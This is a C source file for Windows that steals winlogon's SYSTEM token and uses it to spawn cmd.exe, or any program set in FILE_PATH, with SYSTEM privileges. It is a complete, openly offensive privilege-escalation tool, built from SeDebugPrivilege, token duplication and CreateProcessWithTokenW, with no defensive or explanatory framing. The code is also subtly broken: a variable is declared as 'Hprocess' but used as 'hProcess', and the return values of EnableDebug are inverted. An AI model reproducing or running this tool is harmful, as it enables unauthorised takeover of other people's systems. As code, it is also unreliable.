//Thie function steal a token from winlogon - one of the vulnerable processes with system token(privileges), and creates a new cmd with that token
//You can change - FILE_PATH to change the cmd to the desired program you want to run as system

#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>

#define MAX_LEN 1024
#define FILE_PATH "C:\\Windows\\System32\\cmd.exe"


BOOL EnableDebug(void)
{
	LUID privilegeLuid;
	if (!LookupPrivilegeValue(NULL, _T("SeDebugPrivilege"), &privilegeLuid))
	{
		_tprintf(_T("Error - can't get privilege\n"));
		return FALSE;
	}

	TOKEN_PRIVILEGES privs;
	privs.PrivilegeCount = 1;
	privs.Privileges[0].Luid = privilegeLuid;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	HANDLE currentProc = GetCurrentProcess();
	HANDLE token;

	if (!OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
	{
		_tprintf(_T("Error - can't get token from process\n"));
		return FALSE;
	}

	DWORD size = 0;
	GetTokenInformation(token, TokenPrivileges, NULL, 0, &size);
	PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)malloc(size);
	GetTokenInformation(token, TokenPrivileges, tokenPrivs, size, &size);

	PLUID_AND_ATTRIBUTES luid;
	for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
	{
		luid = &tokenPrivs->Privileges[i];
		if ((luid->Luid.LowPart == privilegeLuid.LowPart) & (luid->Luid.HighPart == privilegeLuid.HighPart))
		{
			if (AdjustTokenPrivileges(token, FALSE, &privs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
			{
				_tprintf(_T("SeDebugPriv Enabled!"));
				CloseHandle(currentProc);
				CloseHandle(token);
				return 0;
			}
		}
	}
	_tprintf(_T("Cant get SeDebugPriv Enabled!"));
	CloseHandle(currentProc);
	CloseHandle(token);
	return 1;
}

DWORD GetPid(TCHAR* ProcName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);
	Process32First(snapshot, &process);

	while (Process32Next(snapshot, &process))
	{
		if (_tcscmp(process.szExeFile, ProcName) == 0)
		{
			break;
		}
	}
	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int _tmain(int argc, TCHAR* argvp[])
{
	EnableDebug();
	TCHAR ProcName[MAX_LEN] = _T("winlogon.exe");
	DWORD pid = GetPid(ProcName);
	
	HANDLE Hprocess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (!Hprocess)
	{
		_tprintf(_T("Can't open process\n"));
		return 1;
	}

	HANDLE token;
	DWORD len;
	HANDLE newToken;
	if (!OpenProcessToken(Hprocess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &token))
	{
		_tprintf(_T("Can't get process token\n"));
		CloseHandle(hProcess);
		return 1;
	}

	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newToken))
	{
		_tprintf(_T("Can't duplicate token \n"));
		CloseHandle(hProcess);
		CloseHandle(token);
		return 1;
	}

	PROCESS_INFORMATION procInfo = {};
	STARTUPINFO startInfo = {};

	if (!CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, _T(FILE_PATH), NULL, CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo))
	{
		_tprintf(_T("Can't create process with stolen token\n"));
		return 1;
	}
	CloseHandle(hProcess);
	CloseHandle(token);
	CloseHandle(newToken);
	return 0;
}
